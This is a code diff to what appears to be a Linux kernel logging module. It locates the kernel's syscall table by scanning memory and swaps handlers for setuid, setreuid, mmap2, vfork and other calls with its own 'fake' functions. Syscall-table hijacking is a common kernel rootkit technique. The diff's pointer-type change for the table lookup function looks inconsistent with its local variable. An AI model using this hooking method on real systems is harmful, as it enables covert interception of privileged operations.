@@ -395,7 +395,7 @@ asmlinkage pid_t our_fake_vfork_function(struct pt_regs regs)
 
 /* From other source: https://bbs.archlinux.org/viewtopic.php?id=139406 */
 
-static unsigned long **aquire_sys_call_table(void)
+static unsigned long *aquire_sys_call_table(void)
 {
 	unsigned long int offset = PAGE_OFFSET;
 	unsigned long **sct;
@@ -464,7 +464,7 @@ static int __init logger_init(void)
 		original_sys_ioperm =(void * )xchg(&(sys_call_table[__NR_ioperm]), our_fake_ioperm_function);
 		//
 		original_sys_setuid =(void * )xchg(&(sys_call_table[__NR_setuid]), our_fake_setuid_function);
-		original_sys_setreuid =(void * )xchg(&(sys_call_table[__NR_setruid]), our_fake_setreuid_function);
+		original_sys_setreuid =(void * )xchg(&(sys_call_table[__NR_setreuid32]), our_fake_setreuid_function);
 		original_sys_mmap2 =(void * )xchg(&(sys_call_table[__NR_mmap2]), our_fake_mmap2_function);
 		original_sys_vfork =(void * )xchg(&(sys_call_table[__NR_vfork]), our_fake_vfork_function);
 		original_sys_pread =(void * )xchg(&(sys_call_table[__NR_pread64]), our_fake_pread_function);
@@ -510,7 +510,7 @@ static void __exit logger_exit(void)
 		//
 
 		xchg(&(sys_call_table[__NR_setuid]), original_sys_setuid);
-		xchg(&(sys_call_table[__NR_setreuid]), original_sys_setreuid);
+		xchg(&(sys_call_table[__NR_setreuid32]), original_sys_setreuid);
 		xchg(&(sys_call_table[__NR_mmap2]), original_sys_mmap2);
 		xchg(&(sys_call_table[__NR_vfork]), original_sys_vfork);
 		xchg(&(sys_call_table[__NR_pread64]), original_sys_pread);
